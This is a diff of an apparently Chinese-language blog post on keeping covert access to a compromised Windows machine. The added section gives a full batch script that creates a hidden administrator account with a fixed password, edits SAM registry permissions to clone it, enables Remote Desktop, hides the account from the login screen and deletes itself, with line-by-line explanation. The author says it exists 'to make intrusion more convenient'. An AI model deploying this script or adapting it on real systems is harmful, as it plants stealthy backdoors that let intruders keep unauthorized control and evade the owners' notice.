@@ -141,7 +141,45 @@ reg add &quot;HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services&quot
 <p><strong><em>此时再进行远程桌面连接，发现可以多用户登陆！！！</em></strong></p>
 <h3 id="BUG"><a href="#BUG" class="headerlink" title="BUG"></a>BUG</h3><p>&emsp;&emsp;在后续尝试中，发现一个小BUG，远程连接过一次后，在被控主机切换用户时，会显示wen$已登陆，这样显然会被发现本机已经被渗透了。</p>
 <h3 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h3><p>&emsp;&emsp;在HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList <strong>（若注册表中没有则自行创建）</strong>下新建DWORD值，名称为wen$,值为0隐藏，值为1显示。再次切换用户，登录界面已经没有隐藏用户。</p>
-<h1 id="方法二：以开关机为出发时间的计划任务创建删除用户"><a href="#方法二：以开关机为出发时间的计划任务创建删除用户" class="headerlink" title="方法二：以开关机为出发时间的计划任务创建删除用户"></a>方法二：以开关机为出发时间的计划任务创建删除用户</h1><h1 id="方法三：小马拉大马"><a href="#方法三：小马拉大马" class="headerlink" title="方法三：小马拉大马"></a>方法三：小马拉大马</h1>
+<h3 id="制作成批处理文件"><a href="#制作成批处理文件" class="headerlink" title="制作成批处理文件"></a>制作成批处理文件</h3><p>&emsp;&emsp;为了更方便入侵渗透，我按照上述原理制作成.bat文件。</p>
+<pre><code>net user admins$ 1234567 /add
+net localgroup administrators admins$ /add
+Echo HKEY_LOCAL_MACHINE\SAM [1] &gt;&gt;c:/tem.ini
+Echo HKEY_LOCAL_MACHINE\SAM\SAM [1] &gt;&gt;c:/tem.ini
+Echo HKEY_LOCAL_MACHINE\SAM\SAM\Domains [1] &gt;&gt;c:/tem.ini
+Echo HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account [1] &gt;&gt;c:/tem.ini
+Echo HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users [1] &gt;&gt;c:/tem.ini
+Echo HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names [1] &gt;&gt;c:/tem.ini
+regini c:/tem.ini
+regedit /e c:\1.reg HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users
+net user admins$ /del
+regedit /s c:\1.reg
+reg delete &quot;HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services&quot; /F
+reg add &quot;HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services&quot; /v fDenyTSConnections /t REG_DWORD /d 0
+reg add &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts&quot;
+reg add &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList&quot;
+reg add &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList&quot; /v admins$ /t REG_DWORD /d 0
+Echo HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names [0] &gt;c:/tem.ini
+Echo HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users [0] &gt;&gt;c:/tem.ini
+Echo HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account [0] &gt;&gt;c:/tem.ini
+Echo HKEY_LOCAL_MACHINE\SAM\SAM\Domains [0] &gt;&gt;c:/tem.ini
+Echo HKEY_LOCAL_MACHINE\SAM\SAM [0] &gt;&gt;c:/tem.ini
+Echo HKEY_LOCAL_MACHINE\SAM\ [0] &gt;&gt;c:/tem.ini
+regini c:/tem.ini
+del c:\tem.ini
+del c:\1.reg
+del %0</code></pre><blockquote>
+<p>前两行为创建admins$的用户，密码为1234567，并提权<br>Echo<em>类型的命令为将信息写入c:/tem.ini<br>regini</em>类型为修改注册表权限，[1]为完全访问<br>regedit /e导出<br>regedit /s导入<br>del %0:删除自身</p>
+</blockquote>
+<h3 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h3><p>&emsp;&emsp;还是无法使用admins$登陆，原因是权限不够，有两种解决办法</p>
+<blockquote>
+<p>远程连接设置中添加隐藏用户<br>在.bat文件中加入命令<br>net localgroup Remote Desktop Users admins$ /add</p>
+</blockquote>
+<blockquote>
+<p>替换注册表中的隐藏用户的F值</p>
+</blockquote>
+<p>&emsp;&emsp;虽然可以成功登陆，但是只能登陆一个用户，所以极易被发现，因此还需修改连接数<br>&emsp;&emsp;按照上述原理，修改组策略再运行破解软件就可以达到效果，实际上修改组策略就是修改注册表（不完全是），但是我在网上找了很久，还是不知道<strong>组策略中远程桌面连接服务对应注册表</strong>中的资料，所以暂时先放一放。</p>
+<h1 id="方法二：以开关机为触发时间的计划任务创建删除用户"><a href="#方法二：以开关机为触发时间的计划任务创建删除用户" class="headerlink" title="方法二：以开关机为触发时间的计划任务创建删除用户"></a>方法二：以开关机为触发时间的计划任务创建删除用户</h1><h1 id="方法三：小马拉大马"><a href="#方法三：小马拉大马" class="headerlink" title="方法三：小马拉大马"></a>方法三：小马拉大马</h1>
                             <hr>
                         </div>
                         <br>
